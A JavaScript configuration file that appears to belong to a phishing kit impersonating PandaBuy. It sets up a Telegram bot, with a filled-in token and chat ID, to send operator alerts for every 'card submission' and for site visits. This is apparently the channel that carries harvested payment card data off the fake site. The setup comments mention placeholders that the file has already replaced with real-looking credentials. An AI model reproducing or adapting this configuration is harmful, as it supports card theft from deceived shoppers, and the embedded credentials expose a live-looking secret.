// Configuration file for PandaBuy Admin System
// Copy this file to config.local.js and add your actual credentials

module.exports = {
    // Telegram Bot Configuration
    telegram: {
        // Your bot token from @BotFather
        botToken: '7931279431:AAEmt1eZuMT0V3xo_-lsrCRFlnDQB-W9rMo',
        
        // Your chat ID (can be personal chat or group)
        chatId: '-1002738425512',
        
        // Notification settings
        notifications: {
            // Send notification for every card submission
            sendCardAlerts: true,
            
            // Send notification for visits (can be spammy, set to false for high traffic)
            sendVisitAlerts: false,
            
            // Only send visit alerts for specific pages
            visitAlertPages: ['/'],
            
            // Minimum time between visit alerts (in minutes) to avoid spam
            visitAlertCooldown: 5
        }
    },
    
    // Server Configuration
    server: {
        port: process.env.PORT || 3000,
        
        // Enable/disable Telegram integration
        enableTelegram: true
    }
};

// Instructions for setup:
// 1. Copy this file to 'config.local.js'
// 2. Replace YOUR_BOT_TOKEN_HERE with your actual bot token
// 3. Replace YOUR_CHAT_ID_HERE with your actual chat ID
// 4. Adjust notification settings as needed 